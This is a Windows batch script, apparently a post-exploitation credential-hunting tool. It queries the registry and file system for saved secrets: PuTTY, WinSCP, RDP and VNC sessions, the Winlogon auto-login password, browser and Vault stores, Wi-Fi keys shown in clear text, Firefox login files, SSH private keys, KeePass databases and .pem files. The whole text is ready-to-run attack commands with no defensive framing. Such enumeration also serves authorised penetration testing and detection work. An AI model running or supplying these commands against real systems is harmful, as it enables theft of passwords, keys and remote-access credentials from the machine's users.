@echo off
rem Enumerating saved session information from PuTTY
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s

rem Enumerating stored RDP credentials
reg query "HKCU\Software\Microsoft\Terminal Server Client\Servers" /s

rem Enumerating Windows Credential Manager
reg query "HKCU\Software\Microsoft\Credentials" /s

rem Checking Auto-Login Default Username
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName

rem Checking Auto-Login Default Password
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword

rem Enumerating Internet Explorer or Edge Saved Passwords
reg query "HKCU\Software\Microsoft\Internet Explorer\IntelliForms\Storage2" /s

rem Enumerating Windows Vault Saved Passwords
reg query "HKCU\Software\Microsoft\Vault" /s

rem Listing stored Wi-Fi profiles
netsh wlan show profiles

rem Checking Wi-Fi Profile Details
netsh wlan show profile name="ProfileName" key=clear

rem Searching for passwords in configuration files
findstr /si password *.txt *.ini *.config

rem Searching for passwords in registry
reg query HKCU /f "password" /t REG_SZ /s

rem Listing Firefox stored credentials
dir /s /b "%APPDATA%\Mozilla\Firefox\Profiles\*.default\logins.json"

rem Enumerating saved credentials from Windows Remote Desktop Manager
reg query "HKCU\Software\Devolutions\RemoteDesktopManager" /s

rem Searching for SSH private keys
dir /s /b "%USERPROFILE%\.ssh\id_rsa"

rem Enumerating VNC saved passwords
reg query "HKCU\Software\RealVNC\VNCViewer" /s

rem Enumerating WinSCP saved sessions
reg query "HKCU\Software\Martin Prikryl\WinSCP 2\Sessions" /s

rem Checking for .rdp files
dir /s /b *.rdp

rem Enumerating credential backups in Windows
reg query "HKCU\Software\Microsoft\CredentialsBackup" /s

rem Checking for GPP Passwords in registry
reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows\Group Policy\History" /s

rem Searching for KeePass databases
dir /s /b %USERPROFILE%\*.kdbx

rem Searching for .pem files
dir /s /b %USERPROFILE%\*.pem

